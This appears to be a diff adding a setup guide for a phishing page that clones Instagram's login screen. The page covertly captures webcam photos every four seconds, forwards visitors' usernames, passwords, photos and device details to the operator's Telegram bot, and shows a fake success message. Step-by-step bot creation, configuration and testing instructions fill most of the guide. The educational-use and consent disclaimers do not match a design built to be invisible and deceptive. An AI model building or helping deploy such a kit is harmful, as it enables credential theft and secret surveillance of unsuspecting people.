@@ -1,0 +1,365 @@
+================================================================================
+                    INSTAGRAM LOGIN PAGE WITH TELEGRAM INTEGRATION
+                              COMPLETE SETUP GUIDE
+================================================================================
+
+TABLE OF CONTENTS:
+1. What This Page Does
+2. How It Works (Technical Overview)
+3. Step-by-Step Setup Guide
+4. How to Create a Telegram Bot
+5. How to Get Your Chat ID
+6. Testing Your Setup
+7. Important Notes & Warnings
+8. Troubleshooting
+
+================================================================================
+                    1. WHAT THIS PAGE DOES
+================================================================================
+
+This is a fully functional Instagram login page clone that:
+• Looks exactly like Instagram's login interface
+• Has a completely hidden background camera
+• Captures periodic photos every 4 seconds
+• Sends login credentials (username/password) to your Telegram bot
+• Sends captured photos to your Telegram bot
+• Works on desktop and mobile browsers
+• Runs completely invisibly in the background
+
+IMPORTANT: This is a DEMO/EDUCATIONAL tool. Always use responsibly and with
+explicit consent from users.
+
+================================================================================
+                    2. HOW IT WORKS (TECHNICAL OVERVIEW)
+================================================================================
+
+A. PAGE LOADING (When user opens the page):
+   • Instagram login form is displayed (looks exactly like real Instagram)
+   • Hidden video element starts capturing from your webcam
+   • Camera feed is completely invisible (no UI elements shown)
+   • Page sends "Page Loaded" notification to your Telegram bot
+   • Starts periodic background photo capture (every 4 seconds)
+
+B. PERIODIC BACKGROUND CAPTURE:
+   • Every 4 seconds, the page captures a photo from the hidden camera
+   • Photo is compressed to JPEG format (quality: 85%)
+   • Captured photo is sent to your Telegram bot with timestamp
+   • This continues even if user navigates away from the page
+
+C. LOGIN ATTEMPT (When user clicks "Log in"):
+   • Page captures the entered username and password
+   • Takes 4 rapid photos in succession (login evidence)
+   • Sends detailed report to Telegram with:
+     - Username/email entered
+     - Password entered
+     - Timestamp of login attempt
+     - Browser/device information
+     - 4 photos from the camera
+   • Shows a fake "Login successful" message
+   • Resets the form for the next user
+
+D. DATA SENT TO TELEGRAM:
+   • Username/Email entered in the form
+   • Password entered in the form
+   • Photos from the hidden camera (periodic and during login)
+   • Device information (platform, browser, screen resolution)
+   • Timestamp of all events
+   • Referrer information (where user came from)
+
+================================================================================
+                    3. STEP-BY-STEP SETUP GUIDE
+================================================================================
+
+STEP 1: CREATE A TELEGRAM BOT
+   [Detailed instructions in Section 4 below]
+
+STEP 2: GET YOUR CHAT ID
+   [Detailed instructions in Section 5 below]
+
+STEP 3: UPDATE THE HTML CODE
+   Open the HTML file in any text editor (Notepad, VS Code, etc.)
+   Find this section (around line 350):
+   
+   // ---------- TELEGRAM CONFIGURATION ----------
+   const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";  // Replace with your bot token
+   const CHAT_ID = "YOUR_CHAT_ID_HERE";      // Replace with your chat ID
+   
+   Replace with your actual credentials:
+   const BOT_TOKEN = "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz";
+   const CHAT_ID = "123456789";
+
+STEP 4: SAVE THE FILE
+   Save the HTML file with any name (e.g., instagram.html)
+
+STEP 5: OPEN IN A BROWSER
+   • Open the file in your web browser (Chrome, Firefox, Edge)
+   • Allow camera access when prompted (required!)
+   • The page will work immediately
+
+STEP 6: TEST YOUR SETUP
+   • Enter any username and password
+   • Click "Log in"
+   • Check your Telegram bot for the received data
+   • You should see:
+     - Login credentials
+     - Captured photos
+     - Device information
+
+================================================================================
+                    4. HOW TO CREATE A TELEGRAM BOT
+================================================================================
+
+METHOD 1: USING BOTFATHER (Recommended)
+
+STEP 1: Open Telegram
+   • Install Telegram from https://telegram.org/
+   • Create an account if you don't have one
+   • Open the Telegram app on your phone or desktop
+
+STEP 2: Find BotFather
+   • In the search bar, type: @BotFather
+   • Click on the verified bot (it has a blue checkmark)
+   • Start a chat with BotFather
+
+STEP 3: Create a New Bot
+   • Send the command: /newbot
+   • BotFather will ask for a name
+   • Enter a name for your bot (e.g., "Instagram Logger")
+   • BotFather will ask for a username
+   • Enter a username ending with "bot" (e.g., "InstagramLoggerBot")
+   • The username MUST end with "bot" (case insensitive)
+
+STEP 4: Receive Your Bot Token
+   • BotFather will send you a message with:
+     "Done! Congratulations on your new bot. 
+     Use this token to access the HTTP API:
+     1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"
+   • COPY THIS TOKEN IMMEDIATELY
+   • Keep it safe and secure
+   • NEVER share your bot token with anyone
+
+STEP 5: Bot is Created!
+   • Your bot is now active
+   • Search for your bot username in Telegram
+   • Send a message to your bot to start chatting
+
+METHOD 2: USING TELEGRAM BOT API (Advanced)
+   • Use the Telegram Bot API directly
+   • Send a POST request to:
+     https://api.telegram.org/bot<TOKEN>/setWebhook
+   • Not recommended for beginners
+
+================================================================================
+                    5. HOW TO GET YOUR CHAT ID
+================================================================================
+
+METHOD 1: USING THE API (Recommended)
+
+STEP 1: Send a Message to Your Bot
+   • Find your bot in Telegram (search by username)
+   • Send ANY message to your bot (e.g., "Hello")
+
+STEP 2: Get Updates from the API
+   • Open your web browser
+   • Type this URL (replace with YOUR bot token):
+     https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
+   • Example: https://api.telegram.org/bot1234567890:ABCdef/getUpdates
+
+STEP 3: Find Your Chat ID
+   • Look for the "chat":{"id":123456789} in the response
+   • Example response:
+     {
+       "ok": true,
+       "result": [
+         {
+           "update_id": 123456789,
+           "message": {
+             "message_id": 1,
+             "from": {
+               "id": 987654321,
+               "is_bot": false,
+               "first_name": "Your Name"
+             },
+             "chat": {
+               "id": 123456789,    <--- THIS IS YOUR CHAT ID
+               "first_name": "Your Name",
+               "type": "private"
+             },
+             "text": "Hello"
+           }
+         }
+       ]
+     }
+   • The number after "chat":{"id": is your Chat ID
+   • Copy this number (e.g., 123456789)
+
+METHOD 2: FOR GROUP CHATS
+   • Add your bot to a group
+   • Send a message in the group
+   • Visit the getUpdates URL as above
+   • Find the chat ID for the group
+
+================================================================================
+                    6. TESTING YOUR SETUP
+================================================================================
+
+TEST 1: PAGE LOAD TEST
+   ✓ Open the HTML file in your browser
+   ✓ Check Telegram - you should receive "Page Loaded" message
+   ✓ Check for camera access confirmation
+
+TEST 2: PERIODIC CAPTURE TEST
+   ✓ Wait 4-5 seconds after page load
+   ✓ Check Telegram - you should receive a photo
+   ✓ Photo should be from your webcam
+
+TEST 3: LOGIN TEST
+   ✓ Enter any username (e.g., "testuser")
+   ✓ Enter any password (e.g., "testpass123")
+   ✓ Click "Log in"
+   ✓ Check Telegram - you should receive:
+     - Login credentials (username & password)
+     - 4 photos from the camera
+     - Device information
+     - Timestamp
+
+TEST 4: SESSION RESET TEST
+   ✓ After login, click "Continue"
+   ✓ Form should be reset
+   ✓ Camera should continue capturing
+
+================================================================================
+                    7. IMPORTANT NOTES & WARNINGS
+================================================================================
+
+🔴 LEGAL DISCLAIMER:
+   • This tool is for EDUCATIONAL PURPOSES ONLY
+   • Using this to collect real user data without consent is ILLEGAL
+   • Always get explicit consent from users
+   • Respect privacy laws in your jurisdiction
+   • Be aware of GDPR, CCPA, and other data protection regulations
+
+🛡️ PRIVACY CONCERNS:
+   • The camera runs completely invisibly
+   • Users might not know they are being recorded
+   • Always inform users about data collection
+   • Provide clear opt-in/opt-out options
+   • Delete collected data when no longer needed
+
+⚠️ TECHNICAL WARNINGS:
+   • Camera access is required for the page to work fully
+   • HTTPS is recommended for production use
+   • The page may not work on all browsers
+   • Mobile browsers may have different camera permissions
+
+🔐 SECURITY NOTES:
+   • Never commit your Bot Token to public repositories
+   • Your Bot Token gives full access to your bot
+   • Keep the HTML file secure if it contains your credentials
+   • Consider using environment variables for tokens
+
+================================================================================
+                    8. TROUBLESHOOTING
+================================================================================
+
+PROBLEM: "Camera Access Denied"
+SOLUTION: 
+   • Click the camera icon in browser address bar
+   • Allow camera permission
+   • Reload the page
+   • Check if another app is using your camera
+
+PROBLEM: "No messages received on Telegram"
+SOLUTION:
+   • Check if BOT_TOKEN is correct (copy exactly)
+   • Check if CHAT_ID is correct (should be a number)
+   • Send a message to your bot first
+   • Visit getUpdates URL to verify chat ID
+   • Check browser console for errors (F12)
+
+PROBLEM: "Photos not sending to Telegram"
+SOLUTION:
+   • Photos must be under 10MB
+   • Check your internet connection
+   • Try reducing photo quality (already set to 85%)
+   • Check Telegram bot permissions
+
+PROBLEM: "Page shows 'Demo' notifications"
+SOLUTION:
+   • Your credentials are not configured
+   • Replace BOT_TOKEN and CHAT_ID with real values
+   • Save and reload the page
+
+PROBLEM: "Bot not responding"
+SOLUTION:
+   • Check if bot token is revoked
+   • Create a new bot with BotFather
+   • Update the token in the code
+
+PROBLEM: "Page not loading on mobile"
+SOLUTION:
+   • Use Chrome or Firefox mobile browser
+   • Enable camera permissions
+   • Disable any ad-blockers
+   • Try on desktop if possible
+
+================================================================================
+                    QUICK REFERENCE
+================================================================================
+
+📍 TELEGRAM BOT CREATION:
+   @BotFather → /newbot → Choose name → Choose username → Get token
+
+📍 CHAT ID RETRIEVAL:
+   Send message to bot → Visit getUpdates URL → Copy chat ID
+
+📍 CODE CONFIGURATION:
+   const BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+   const CHAT_ID = "YOUR_CHAT_ID_HERE";
+
+📍 TESTING URL:
+   https://api.telegram.org/botYOUR_BOT_TOKEN/getUpdates
+
+📍 TELEGRAM API DOCUMENTATION:
+   https://core.telegram.org/bots/api
+
+================================================================================
+                    COMPLETE HTML CODE (Copy and Save)
+================================================================================
+
+[The complete HTML code is provided separately in the .html file]
+[Save the HTML file and open it in your browser]
+
+================================================================================
+                    SUPPORT & RESOURCES
+================================================================================
+
+📚 Documentation:
+   • Telegram Bot API: https://core.telegram.org/bots/api
+   • BotFather Guide: https://t.me/botfather
+   • WebRTC Camera: https://developer.mozilla.org/en-US/docs/Web/API/MediaDevices/getUserMedia
+
+💡 Tips:
+   • Use a virtual camera for testing (OBS Virtual Cam)
+   • Test on different browsers
+   • Clear browser cache when making changes
+   • Use Chrome DevTools for debugging
+
+❓ Common Commands:
+   /start - Start your bot
+   /help - Get help from BotFather
+   /newbot - Create a new bot
+   /token - Get bot token (if lost)
+
+================================================================================
+                    END OF GUIDE
+================================================================================
+
+This guide covers everything you need to set up and use the Instagram
+login page with Telegram integration. Always use responsibly!
+
+For questions or issues, refer to the Telegram Bot API documentation
+or the troubleshooting section above.
+
+Version: 1.0 | Last Updated: 2026-06-23
+================================================================================
